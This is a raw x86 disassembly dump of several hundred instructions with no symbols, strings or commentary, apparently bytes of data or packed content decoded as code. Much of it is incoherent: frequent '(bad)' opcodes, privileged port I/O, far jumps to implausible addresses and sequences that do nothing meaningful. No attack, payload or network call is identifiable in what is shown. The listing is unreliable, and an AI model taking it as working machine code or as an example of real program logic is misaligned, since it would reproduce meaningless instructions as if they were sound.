  427cc3:	sub    BYTE PTR [ebp-0x7e],dl
  427cc6:	sar    ebp,0xb
  427cc9:	jmp    FWORD PTR [edi+0x2400392a]
  427ccf:	sub    esi,DWORD PTR [ebx-0x73]
  427cd2:	mov    esp,DWORD PTR [ecx+edi*4]
  427cd5:	mov    ecx,DWORD PTR [eax]
  427cd7:	and    BYTE PTR [eax],al
  427cd9:	jne    0x427ca5
  427cdb:	sub    ebp,ecx
  427cdd:	sbb    BYTE PTR [esi+0x32],ah
  427ce0:	dec    ebp
  427ce1:	push   ebp
  427ce2:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  427ce8:	ret    
  427ce9:	mov    edx,ebp
  427ceb:	leave  
  427cec:	sub    DWORD PTR [esi+0x24],ebx
  427cef:	ret    0x2b
  427cf2:	pop    ax
  427cf4:	push   ebp
  427cf5:	rol    BYTE PTR [ebx],0xeb
  427cf8:	add    DWORD PTR [ecx+0x6c0001],0x40
  427cff:	jb     0x427d56
  427d01:	ret    
  427d02:	in     al,dx
  427d03:	jecxz  0x427c90
  427d05:	push   esi
  427d06:	xchg   esp,eax
  427d07:	jne    0x427d09
  427d09:	cmp    edx,DWORD PTR [esi+0x1c]
  427d0c:	jne    0x427cf2
  427d0e:	mov    eax,DWORD PTR [ebp-0x77]
  427d11:	ror    DWORD PTR [ebx+0x899408],0xe0
  427d18:	mov    esi,DWORD PTR [ebp-0x75]
  427d1b:	pop    esi
  427d1c:	nop
  427d1d:	mov    eax,DWORD PTR [eax]
  427d1f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  427d25:	add    al,0x0
  427d27:	inc    ebp
  427d28:	mov    eax,DWORD PTR [ebx]
  427d2a:	mov    ebp,ebx
  427d2c:	cmp    al,0xf
  427d2e:	or     al,al
  427d30:	inc    ebp
  427d31:	inc    ebp
  427d32:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  427d38:	cld    
  427d39:	add    BYTE PTR [edi+0x506c16c0],dh
  427d3f:	add    BYTE PTR [ecx-0x5],dl
  427d42:	add    eax,0x17200
  427d47:	sbb    al,0x85
  427d49:	dec    esp
  427d4a:	je     0x427d84
  427d4c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  427d50:	add    BYTE PTR [ebx],bh
  427d52:	(bad)  
  427d53:	and    al,0x39
  427d55:	jae    0x427cf3
  427d57:	mov    cl,cl
  427d59:	inc    DWORD PTR [esp]
  427d5c:	push   ebp
  427d5d:	shr    esp,0x8
  427d60:	in     al,dx
  427d61:	push   esp
  427d62:	add    DWORD PTR [eax],esp
  427d64:	add    bl,cl
  427d66:	inc    ebp
  427d67:	mov    bh,0x89
  427d69:	add    ah,bh
  427d6b:	jmp    0xca7b8cb5
  427d70:	pushf  
  427d71:	dec    esp
  427d72:	mov    edx,0xf8178520
  427d77:	fst    DWORD PTR [ebp+0x0]
  427d7a:	mov    BYTE PTR [eax],0xc4
  427d7d:	sub    edx,DWORD PTR [ebx-0x3f]
  427d80:	inc    ebp
  427d81:	add    eax,0xc601dc
  427d86:	mov    al,0xc6
  427d89:	ins    BYTE PTR es:[edi],dx
  427d8a:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  427d91:	dec    esp
  427d92:	jmp    DWORD PTR [eax]
  427d94:	inc    ebp
  427d95:	fnstcw WORD PTR [eax+0x29]
  427d98:	test   BYTE PTR [eax],0xc5
  427d9b:	rol    BYTE PTR [eax],0xc0
  427d9e:	lea    ecx,[ebp-0x3cf0dbcb]
  427da4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  427daa:	inc    esi
  427dab:	add    DWORD PTR [eax],ebx
  427dad:	add    dh,bh
  427daf:	mov    esi,DWORD PTR [edx+0x8]
  427db2:	(bad)  
  427db3:	fdiv   QWORD PTR ss:[ecx]
  427db6:	(bad)  
  427db7:	mov    bl,ch
  427db9:	add    esi,eax
  427dbb:	add    dh,bl
  427dbd:	or     esi,eax
  427dbf:	mov    dl,0xdf
  427dc1:	add    esi,eax
  427dc3:	add    al,ah
  427dc5:	push   cs
  427dc6:	mov    BYTE PTR [edx+0xc601e1],0xe2
  427dcd:	or     BYTE PTR [ebx],dh
  427dcf:	dec    ecx
  427dd0:	lea    eax,[ebx]
  427dd2:	xor    eax,0x18fc0fc7
  427dd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427dd8:	repz clc 
  427dda:	add    eax,DWORD PTR [ebp+0x46]
  427ddd:	prefetcht0 BYTE PTR [ecx-0x2]
  427de1:	xor    eax,0x7c60872
  427de6:	mov    esp,0xbd32c698
  427deb:	pop    esi
  427dec:	mov    cl,0xbe
  427def:	or     al,0xc6
  427df1:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  427df8:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  427dff:	add    dh,al
  427e01:	mov    eax,ebx
  427e03:	xor    DWORD PTR [ebx],0x35008dbc
  427e09:	mov    ecx,DWORD PTR [edi]
  427e0b:	sbb    al,0x18
  427e0d:	inc    ebp
  427e0e:	xrelease mov DWORD PTR [ebx],0x188546f4
  427e15:	clc    
  427e16:	(bad)  
  427e17:	cmp    BYTE PTR [edx-0x64],dh
  427e1a:	lea    ecx,[ecx+0x45ffe838]
  427e20:	mov    ecx,esp
  427e22:	fadd   st,st(6)
  427e24:	dec    ebp
  427e25:	lds    edi,FWORD PTR [eax+0x7145fc56]
  427e2b:	out    0x1,eax
  427e2d:	inc    ebp
  427e2e:	lea    ebp,ds:0xc8ffc6ff
  427e34:	enter  0xa33,0xc6
  427e38:	push   ebp
  427e39:	leave  
  427e3a:	(bad)  
  427e3b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  427e41:	add    BYTE PTR [ebp+0x44],al
  427e44:	mov    eax,esp
  427e46:	mov    WORD PTR [esi+0x43398300],?
  427e4c:	psubusw mm4,QWORD PTR [eax-0x78]
  427e50:	add    BYTE PTR [ebx-0x1303f975],al
  427e56:	add    BYTE PTR [ebp+0x1],0xf3
  427e5a:	add    BYTE PTR [ebp+0x38],al
  427e5d:	in     eax,dx
  427e5e:	inc    ebp
  427e5f:	inc    ebp
  427e60:	mov    esp,ebx
  427e62:	add    BYTE PTR [ebp+0x0],0xee
  427e66:	mov    DWORD PTR [ebp-0x48],eax
  427e69:	sub    eax,0x2e00454f
  427e6e:	js     0x427eb5
  427e70:	data16 js 0x427df8
  427e73:	idiv   bh
  427e75:	inc    esp
  427e76:	(bad)  
  427e77:	fadd   st(7),st
  427e79:	mov    dh,0x89
  427e7b:	and    DWORD PTR [esi+0x43],0xffffffff
  427e7f:	fld    DWORD PTR [ebx-0x767cc078]
  427e85:	pop    es
  427e86:	push   0x8d45ffec
  427e8b:	in     eax,dx
  427e8c:	inc    DWORD PTR [ebp-0x77]
  427e8f:	loopne 0x427efb
  427e91:	inc    ebp
  427e92:	jmp    esp
  427e94:	add    DWORD PTR [ebp+0x11],0xfffffff1
  427e98:	mov    DWORD PTR [ebp+0x6c],eax
  427e9b:	(bad)  
  427e9d:	inc    ebp
  427e9e:	(bad)  
  427e9f:	call   0xe7cbc3b0
  427ea4:	outs   dx,BYTE PTR ds:[esi]
  427ea5:	inc    ebp
  427ea6:	(bad)  
  427ea7:	js     0x427e2c
  427ea9:	div    BYTE PTR ds:0x70bc8944
  427eaf:	mov    dh,0xff
  427eb1:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  427eb8:	jb     0x427e3d
  427eba:	dec    DWORD PTR [eax]
  427ebc:	mov    ebp,esp
  427ebe:	test   WORD PTR [ebp-0x1],ax
  427ec5:	inc    ebp
  427ec6:	ror    BYTE PTR [ebx-0x117a279a],0xff
  427ecd:	adc    edi,edi
  427ecf:	mov    ecx,esi
  427ed1:	mov    eax,DWORD PTR [eax]
  427ed3:	cmp    BYTE PTR [esi-0x1],ah
  427ed6:	test   DWORD PTR [ebx],edi
  427ed8:	push   DWORD PTR [ebp-0x1]
  427edb:	mov    DWORD PTR [esi-0x48],ebp
  427ede:	add    BYTE PTR [ebp+0x66],al
  427ee1:	jmp    0x427e68
  427ee3:	pushf  
  427ee4:	dec    DWORD PTR [ebx-0x7f9c0301]
  427eea:	add    BYTE PTR [ecx],al
  427eec:	data16 add BYTE PTR [ebp-0x7a00c8],al
  427ef3:	add    al,al
  427ef5:	add    BYTE PTR [esi+0x45],ah
  427ef8:	test   DWORD PTR [ebx+0xff7cff],ecx
  427efe:	dec    esp
  427eff:	mov    DWORD PTR [eax],eax
  427f01:	mov    esp,DWORD PTR [esi-0x4]
  427f04:	inc    ebp
  427f05:	cmp    BYTE PTR [eax+0x4701],0x38
  427f0c:	mov    DWORD PTR [ecx-0x7e],esp
  427f0f:	add    BYTE PTR [edi-0x73],al
  427f12:	push   0xffffffd1
  427f14:	mov    WORD PTR [ebp+0x64],ax
  427f18:	(bad)  
  427f19:	call   eax
  427f1b:	mov    esp,eax
  427f1d:	data16 icebp 
  427f1f:	test   DWORD PTR [ebp-0x1],eax
  427f22:	(bad)  
  427f24:	out    0xc0,eax
  427f26:	lea    esp,[esi-0x30]
  427f29:	test   DWORD PTR [edx+0x43ff80ff],ecx
  427f2f:	inc    edi
  427f30:	jmp    0x75ff:0x40858866
  427f37:	dec    DWORD PTR [ebp-0x7a992f40]
  427f3d:	test   esi,edi
  427f3f:	(bad)  
  427f40:	(bad)  
  427f41:	inc    DWORD PTR [ebp-0x9901b9]
  427f47:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  427f4d:	rcl    BYTE PTR [ecx+0x66],0x33
  427f51:	test   DWORD PTR [ebx+0xff72ff],edi
  427f57:	inc    edi
  427f58:	ret    
  427f59:	mov    ax,WORD PTR [ebp-0x3f0004]
  427f60:	push   eax
  427f61:	mov    DWORD PTR [ebp-0x77],0xff98748b
  427f68:	add    BYTE PTR [ebx-0x764ff439],al
  427f6e:	push   DWORD PTR [esi+0x1]
  427f71:	inc    DWORD PTR [eax]
  427f73:	mov    eax,0xff99ff
  427f78:	or     BYTE PTR [ecx-0x7a87bb],cl
  427f7e:	jne    0x427f38
  427f80:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  427f8a:	mov    ecx,0xd74fb8
  427f8f:	add    cl,al
  427f91:	mov    DWORD PTR [ecx-0x3f007784],ecx
  427f97:	or     DWORD PTR [ebx+0x558966ec],0x7e
  427f9e:	(bad)  
  427f9f:	push   ebp
  427fa1:	mov    eax,0x8c2789
  427fa6:	ret    0x6689
  427fa9:	adc    BYTE PTR [ebp+0x4c],0x8d
  427fad:	add    bl,bl
  427faf:	mov    WORD PTR [ebp-0x70],ax
  427fb3:	(bad)  
  427fb4:	ret    0x660d
  427fb7:	or     BYTE PTR [ebp-0x77],dl
  427fba:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  427fc1:	in     al,0x89
  427fc3:	(bad)  
  427fc4:	xchg   esi,eax
  427fc5:	aam    0xcf
  427fc7:	call   0x45daf855
  427fcc:	dec    edx
  427fcd:	pop    ecx
  427fce:	mov    edx,DWORD PTR [eax]
  427fd0:	repnz push bp
  427fd3:	or     BYTE PTR [ebx+0x5510663b],0x49
  427fda:	(bad)  
  427fdb:	repnz xor eax,0xa0898945
  427fe1:	mov    ah,0x89
  427fe3:	jmp    DWORD PTR [edx+0x66b0418d]
  427fe9:	inc    DWORD PTR [ebp+0x50]
  427fec:	add    DWORD PTR [ebp-0x5],0xffffffbe
  427ff0:	mov    DWORD PTR [eax],ecx
  427ff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ff3:	pop    es
  427ff4:	inc    ecx
  427ff5:	(bad)  
  427ff6:	cbw    
  427ff8:	inc    ebp
  427ff9:	xor    ah,BYTE PTR [esi+0x3]
  427ffc:	dec    ebp
  427ffd:	push   eax
  427ffe:	inc    bp
  428000:	jge    0x427f85
  428002:	mov    esp,DWORD PTR [esi-0x18]
  428005:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  42800b:	add    DWORD PTR [ebx],esi
  42800d:	add    BYTE PTR [ebx],al
  42800f:	test   DWORD PTR [ebx],esi
  428011:	(bad)  
  428012:	inc    WORD PTR [ebp+0x0]
  428016:	mov    eax,DWORD PTR [eax]
  428018:	call   0x8898374d
  42801d:	mov    esi,eax
  42801f:	clc    
  428020:	ret    
  428021:	rol    cl,0xa
  428024:	mov    DWORD PTR ds:0x7c0ec88,esi
  42802a:	mov    edx,edi
  42802c:	pushf  
  42802d:	pop    es
  42802e:	jmp    FWORD PTR [edx+0x66]
  428031:	add    BYTE PTR [ebp-0x990175],al
  428037:	inc    ebp
  428038:	test   DWORD PTR [ebx-0x2f000202],eax
  42803e:	push   ebp
  42803f:	mov    edi,eax
  428041:	mov    dh,BYTE PTR [eax+0x266ff51]
  428047:	push   ebp
  428048:	add    BYTE PTR [ebx-0x764b1777],al
  42804e:	dec    DWORD PTR [esi+0x661851e8]
  428054:	add    BYTE PTR [ebp-0x7b],dl
  428057:	cmp    esi,0xfffffffb
  42805a:	dec    DWORD PTR [ecx+0x51fe9285]
  428060:	jmp    DWORD PTR [esi-0x75]
  428063:	push   ebp
  428064:	hlt    
  428065:	data16 (bad) 
  428067:	dec    ebp
  428068:	ret    
  428069:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42806f:	lea    edx,[eax-0x1]
  428072:	jne    0x428045
  428074:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42807a:	dec    BYTE PTR [ecx+0x51559eff]
  428080:	mov    DWORD PTR [esi-0x4c],esp
  428083:	push   ebp
  428084:	jmp    DWORD PTR [esi-0x18]
  428087:	inc    ebp
  428088:	sbb    BYTE PTR [ebp-0x767ae500],cl
  42808e:	(bad)  
  42808f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428090:	inc    eax
  428092:	test   DWORD PTR [esi-0x2],esp
  428095:	inc    ebp
  428096:	dec    DWORD PTR [ebp-0x760bde75]
  42809c:	(bad)  
  42809d:	test   al,0xc3
  42809f:	mov    DWORD PTR [ebp-0x769b56],ecx
  4280a5:	lods   al,BYTE PTR ds:[esi]
  4280a6:	push   eax
  4280a7:	inc    ebp
  4280a8:	jne    0x4280b9
  4280aa:	dec    DWORD PTR [ebp+0x8]
  4280ad:	mov    eax,DWORD PTR [edi]
  4280af:	sbb    al,0x0
  4280b1:	(bad)  
  4280b2:	mov    eax,0xc14fc3
  4280b7:	mov    DWORD PTR [eax-0x64],edi
  4280ba:	inc    bp
  4280bc:	test   DWORD PTR [edi],ecx
  4280be:	dec    DWORD PTR [ebp-0x1]
  4280c1:	xor    eax,edi
  4280c3:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  4280c9:	inc    ebp
  4280ca:	xor    DWORD PTR [ebx],0x3f
  4280cd:	mov    WORD PTR [ebp-0x1bc],ax
  4280d4:	lea    ecx,[ecx-0x767702]
  4280da:	inc    esi
  4280db:	(bad)  
  4280dc:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  4280e3:	pushf  
  4280e4:	rol    DWORD PTR [ebp-0x72019a],0xff
  4280eb:	add    bh,bh
  4280ed:	add    BYTE PTR [edi],cl
  4280ef:	test   DWORD PTR [eax],eax
  4280f1:	(bad)  
  4280f2:	dec    WORD PTR [ebp-0xff002d]
  4280f9:	mov    DWORD PTR [eax+edi*4+0x0],edi
  4280fd:	jmp    DWORD PTR [esi-0x73]
  428100:	lea    esi,[eax+0x50ffffff]
  428106:	fadd   QWORD PTR [ebp+0x0]
  428109:	xor    esp,DWORD PTR [esi+0x3]
  42810c:	lea    edx,[eax-0x1]
  42810f:	test   edi,edi
  428111:	dec    DWORD PTR [ebp-0x1]
  428114:	mov    edi,edi
  428116:	dec    eax
  428117:	clc    
  428118:	call   DWORD PTR [ebp-0x73]
  42811b:	lea    esi,[eax+0x51ffff88]
  428121:	lea    ecx,[ebp-0x78]
  428124:	test   WORD PTR [ebp-0x2],ax
  42812b:	popf   
  42812c:	push   eax
  42812d:	add    BYTE PTR [ecx-0x77],dl
  428130:	xor    edi,DWORD PTR [eax-0x7236007d]
  428136:	cwde   
  428137:	mov    al,0x32
  428139:	inc    DWORD PTR [ebx]
  42813b:	push   eax
  42813c:	push   ecx
  42813d:	inc    ebp
  42813e:	shl    BYTE PTR [ebx],1
  428140:	lea    eax,[ebx]
  428142:	call   DWORD PTR [eax-0x1]
  428145:	test   DWORD PTR [ebx],esi
  428147:	inc    DWORD PTR [eax-0x1]
  42814a:	(bad)  
  42814b:	(bad)  
  42814c:	(bad)  
  42814d:	clc    
  42814e:	call   DWORD PTR [ebp+0x50]
  428151:	jmp    0xcb82cb
  428156:	inc    esp
  428157:	jnp    0x428158
  428159:	add    BYTE PTR [ecx-0x484f73],cl
  42815f:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428165:	mov    eax,DWORD PTR [ecx]
  428167:	data16 add BYTE PTR [ebp-0xb50077],al
  42816e:	inc    eax
  428170:	lea    esp,[esi+0x14]
  428173:	test   DWORD PTR [ecx-0xb301],ecx
  428179:	inc    edi
  42817a:	(bad)  
  42817b:	dec    si
  42817d:	test   edi,edi
  42817f:	(bad)  
  428180:	cmp    eax,0xc74f73ff
  428185:	mov    edx,DWORD PTR [edx-0x7d]
  428188:	push   DWORD PTR [ebx+0x56328939]
  42818e:	(bad)  
  42818f:	call   FWORD PTR [esi-0x47]
  428192:	inc    DWORD PTR ds:0x893c00ea
  428198:	(bad)  
  428199:	pop    eax
  42819a:	mov    ah,0xff
  42819c:	(bad)  
  42819d:	mov    ecx,0x5745
  4281a2:	dec    DWORD PTR [ecx-0xf7a501]
  4281a8:	(bad)  
  4281a9:	mov    ecx,0x456108
  4281ae:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  4281b4:	test   BYTE PTR [ebp-0x72ff23fd],cl
  4281ba:	inc    BYTE PTR gs:[eax]
  4281bd:	inc    DWORD PTR [ebp-0x73]
  4281c0:	cmp    dh,bh
  4281c2:	pushf  
  4281c3:	inc    edi
  4281c5:	mov    ebx,eax
  4281c7:	hlt    
  4281c8:	test   DWORD PTR [ecx-0xbab708],ecx
  4281ce:	cmp    al,0xbe
  4281d0:	pushf  
  4281d1:	or     bh,al
  4281d3:	pop    es
  4281d4:	lock into 
  4281d6:	test   eax,eax
  4281d8:	clc    
  4281d9:	mov    ebx,0x387245
  4281de:	lahf   
  4281df:	retf   
  4281e0:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  4281e6:	add    edi,edi
  4281e8:	add    BYTE PTR [ecx+0x45],dl
  4281eb:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  4281f2:	mov    edx,DWORD PTR [ecx-0x74]
  4281f5:	inc    DWORD PTR [eax]
  4281f7:	cld    
  4281f8:	mov    eax,DWORD PTR [ebp-0x6f0175]
  4281fe:	add    BYTE PTR [ebp-0x1b0177],al
  428204:	jge    0x42824b
  428206:	test   DWORD PTR [ebx+0xff9875],ecx
  42820c:	sbb    BYTE PTR [esi+0x55],ah
  42820f:	xchg   ebp,eax
  428210:	call   0x427d14
  428215:	push   edi
  428216:	inc    ebp
  428217:	mov    dx,WORD PTR [ebp-0xfc0075]
  42821e:	cmp    al,0x85
  428220:	ud0    eax,DWORD PTR [ebp-0x1]
  428224:	test   DWORD PTR [edi+0x74],ecx
  428227:	dec    edi
  428228:	inc    DWORD PTR [ebp-0xf70004]
  42822e:	dec    DWORD PTR [edi-0x75]
  428231:	dec    edi
  428232:	cld    
  428233:	test   DWORD PTR [eax+0xff01ff],eax
  428239:	icebp  
  42823a:	add    BYTE PTR [edi-0x3a],cl
  42823d:	test   ebx,eax
  42823f:	inc    BYTE PTR [ebp-0x1]
  428242:	jne    0x428244
  428244:	mov    eax,DWORD PTR [eax]
  428246:	cld    
  428247:	xor    BYTE PTR [ecx+0x500155],cl
  42824d:	push   ebp
  42824e:	xor    DWORD PTR [ecx+0x45011c80],ecx
  428254:	add    BYTE PTR [ebp+0x35e90f50],al
  42825a:	add    al,BYTE PTR [eax]
  42825c:	add    BYTE PTR [ebx-0x38fe4f80],al
  428262:	add    ah,ch
  428264:	or     BYTE PTR [ebp+0x4501f845],dh
  42826a:	jmp    0xde8567
  42826f:	(bad)  
  428270:	nop    ecx
  428273:	test   DWORD PTR [ebp+0x4502f8],eax
  428279:	cmp    cl,BYTE PTR [ebp-0x64]
  42827c:	mov    eax,edi
  42827e:	mov    ebx,DWORD PTR [eax+edx*2]
  428281:	add    eax,0x45fef885
  428286:	dec    DWORD PTR [ebx+0x339445]
  42828c:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428292:	dec    DWORD PTR [ebx-0x460f0375]
  428298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428299:	add    esi,edi
  42829b:	add    bh,bh
  42829d:	rdpmc  
  42829f:	add    BYTE PTR [ebx],0x1
  4282a2:	mov    DWORD PTR [eax],eax
  4282a4:	add    al,0x45
  4282a6:	dec    DWORD PTR [ecx-0x360b3373]
  4282ac:	dec    DWORD PTR [esi]
  4282ae:	push   eax
  4282af:	jne    0x4282f6
  4282b1:	mov    esi,DWORD PTR [ebx]
  4282b3:	cld    
  4282b4:	add    ebp,ebx
  4282b6:	push   eax
  4282b7:	inc    DWORD PTR [ebp-0x75]
  4282ba:	add    eax,0x800e4
  4282bf:	add    BYTE PTR [ebx-0x7f7403bf],cl
  4282c5:	mov    DWORD PTR [ecx],eax
  4282c7:	sbb    al,0x0
  4282c9:	leave  
  4282ca:	test   DWORD PTR [edi-0x2],eax
  4282cd:	jne    0x4282ce
  4282cf:	call   0xff436dd4
  4282d4:	xor    BYTE PTR [ebp+0x4d],al
  4282d7:	mov    edi,edi
  4282d9:	enter  0x8,0x4d
  4282dd:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4282e3:	mov    eax,DWORD PTR [eax]
  4282e5:	cld    
  4282e6:	add    DWORD PTR [ecx],ebx
  4282e8:	inc    ebp
  4282e9:	dec    ebp
  4282ea:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4282f0:	inc    eax
  4282f1:	dec    DWORD PTR [ecx-0x270375]
  4282f7:	add    BYTE PTR [ebx-0x39d72701],cl
  4282fd:	xchg   ecx,eax
  4282fe:	ret    
  4282ff:	add    BYTE PTR [ebp-0x830075],al
  428305:	add    BYTE PTR [ebp-0x75],al
  428308:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  42830e:	lea    edi,[edi-0xc]
  428311:	add    bh,bh
  428313:	mov    edx,DWORD PTR [eax-0x7b]
  428316:	inc    ebp
  428317:	rdpmc  
  428319:	jne    0x42831e
  42831b:	add    BYTE PTR [eax-0x75],dl
  42831e:	inc    ebp
  42831f:	clc    
  428320:	add    eax,0x400009
  428325:	mov    DWORD PTR [ebx-0x7f000304],ecx
  42832b:	mov    eax,DWORD PTR [ecx]
  42832d:	in     al,dx
  42832e:	add    dh,al
  428330:	test   ebx,eax
  428332:	inc    BYTE PTR [ebp-0xff0001]
  428338:	add    BYTE PTR [ebp-0x43],al
  42833b:	cmp    esi,0xfffffff8
  42833e:	(bad)  
  42833f:	push   DWORD PTR [eax]
  428341:	add    BYTE PTR [ebp-0x3a],dl
  428344:	test   ebx,eax
  428346:	je     0x4282cd
  428348:	mov    edi,edi
  42834a:	sbb    al,0xff
  42834c:	test   DWORD PTR gs:[eax],eax
  42834f:	(bad)  
  428350:	js     0x428351
  428352:	add    BYTE PTR [ebx-0x39b20bdd],cl
  428358:	sub    eax,ebx
  42835a:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428360:	add    eax,DWORD PTR [eax]
  428362:	dec    ebp
  428363:	push   eax
  428364:	mov    al,BYTE PTR [ebp+0x1]
  428367:	mov    eax,DWORD PTR [ebp-0x68]
  42836a:	mov    eax,DWORD PTR [eax]
  42836c:	sbb    bh,al
  42836e:	or     ah,dh
  428370:	dec    ebp
  428371:	inc    DWORD PTR [eax+0x4]
  428374:	push   ecx
  428375:	add    BYTE PTR [edx-0x1],dh
  428378:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42837e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428388:	add    ecx,DWORD PTR [ecx-0x1be77477]
  42838e:	push   ecx
  42838f:	cmp    BYTE PTR [ebx],al
  428391:	inc    ebp
  428392:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428398:	(bad)  
  428399:	(bad)  
  42839a:	in     al,0xff
  42839c:	add    BYTE PTR [ebp+0x0],al
  42839f:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4283a5:	add    al,bh
  4283a7:	(bad)  
  4283a8:	jmp    0x8d85:0x74b0558d
  4283af:	dec    DWORD PTR [eax]
  4283b1:	call   DWORD PTR [ebp-0x7b]
  4283b4:	mov    edi,esi
  4283b6:	lock call DWORD PTR [ebp-0x75]
  4283ba:	mov    esi,esp
  4283bc:	mov    ah,0xc6
  4283be:	mov    bh,0xc3
  4283c0:	mov    DWORD PTR [ebx-0x110003c4],ecx
  4283c6:	add    DWORD PTR [eax],0x450050ff
  4283cc:	mov    DWORD PTR [ebx+0x9598cc],ecx
  4283d2:	inc    edi
  4283d4:	push   esp
  4283d6:	jmp    0xcd00:0x680481ff
  4283dd:	mov    DWORD PTR [ebx],esi
  4283df:	clc    
  4283e0:	cmp    edi,0xff9cff3b
  4283e6:	jne    0x4283f0
  4283e8:	mov    eax,eax
  4283ea:	add    esi,DWORD PTR [eax]
  4283ec:	int3   
  4283ed:	inc    ebp
  4283ee:	cmp    al,0x83
  4283f0:	add    BYTE PTR [eax],bl
  4283f2:	adc    DWORD PTR [ebx+0x768b5055],eax
  4283f8:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4283fe:	mov    edi,eax
  428400:	cmp    BYTE PTR [ebp+0x45],cl
  428403:	jmp    0x428390
  428405:	mov    ebx,DWORD PTR [esp+ebp*8]
  428408:	inc    ebp
  428409:	or     al,0x2
  42840b:	dec    DWORD PTR [ebp+0x18]
  42840e:	jne    0x428465
  428410:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  428416:	mov    edi,DWORD PTR [ebx]
  428418:	in     al,0x50
  42841a:	xchg   ecx,eax
  42841b:	jmp    0x342d320
  428420:	adc    al,0x8b
  428422:	inc    ebp
  428423:	mov    al,ds:0x8b04008b
  428428:	push   ebp
  428429:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  42842f:	push   ebp
  428430:	test   DWORD PTR [ebx-0x2800d701],ecx
  428436:	inc    ebp
  428437:	dec    ebp
  428438:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  42843e:	mov    DWORD PTR [eax],0xe9ff00f4
  428444:	add    al,0x0
  428446:	add    BYTE PTR [eax],al
  428448:	mov    eax,edx
  42844a:	push   eax
  42844b:	rol    DWORD PTR [ebp-0xf0177],1
  428451:	bound  eax,QWORD PTR [ebp+0x50]
  428454:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  42845a:	add    BYTE PTR [ecx+0x558df0ff],cl
  428460:	mov    al,0xf
  428462:	test   DWORD PTR [edx],edx
  428464:	call   DWORD PTR [ebp-0x7a0001]
  42846a:	(bad)  
  42846b:	loop   0x42846c
  42846d:	jnp    0xc6987873
  428473:	mov    eax,ebx
  428475:	cmp    al,0x8b
  428477:	(bad)  
  428478:	cld    
  428479:	shr    esi,0xc
  42847c:	add    dl,al
  42847e:	push   eax
  42847f:	lea    eax,[ebp-0x1]
  428482:	mov    edx,esi
  428484:	cwde   
  428485:	cli    
  428486:	add    BYTE PTR [ebp+0x1ffff8ff],al
  42848c:	or     BYTE PTR [eax],cl
  42848e:	inc    ebp
  42848f:	dec    ebp
  428490:	inc    DWORD PTR [ebx+0x74803914]
  428496:	add    DWORD PTR [ebx+0x451800],ecx
  42849c:	call   DWORD PTR [eax+edx*1]
  42849f:	add    ecx,DWORD PTR [ebp-0x34]
  4284a2:	push   edi
  4284a3:	adc    al,0x8
  4284a5:	mov    edx,DWORD PTR [ebp-0x14]
  4284a8:	mov    ecx,DWORD PTR [ebp+0x18]
  4284ab:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4284af:	inc    DWORD PTR [eax+esi*8]
  4284b2:	inc    ebp
  4284b3:	stos   BYTE PTR es:[edi],al
  4284b4:	mov    edx,DWORD PTR [ebp-0x4]
  4284b7:	add    DWORD PTR [ebp-0x1c],eax
  4284ba:	mov    edx,DWORD PTR [ebp-0x70]
  4284bd:	cmp    eax,DWORD PTR [eax]
  4284bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4284c0:	mov    eax,DWORD PTR [eax]
  4284c2:	cld    
  4284c3:	jae    0x428445
  4284c5:	add    eax,DWORD PTR [ecx]
  4284c7:	clc    
  4284c8:	add    BYTE PTR [eax+0x30],dl
  4284cb:	mov    DWORD PTR [ecx],esi
  4284cd:	clc    
  4284ce:	pop    ds
  4284cf:	inc    ebp
  4284d0:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4284d6:	(bad)  
  4284d7:	push   DWORD PTR [edi]
  4284d9:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4284df:	(bad)  
  4284e0:	jae    0x4284e1
  4284e2:	mov    eax,DWORD PTR [ebp-0x740175]
  4284e8:	sub    eax,DWORD PTR [eax]
  4284ea:	add    eax,DWORD PTR [eax]
  4284ec:	mov    DWORD PTR [ecx+0x5f],eax
  4284ef:	mov    DWORD PTR [ebx-0x4],ebx
  4284f2:	ret    0xff
  4284f5:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4284fb:	ret    
  4284fc:	mov    eax,DWORD PTR [ebp-0x6f0075]
  428502:	add    BYTE PTR [ebp-0x7d],al
  428505:	mov    DWORD PTR [eax],eax
  428507:	add    al,0x84
  428509:	inc    DWORD PTR [ecx]
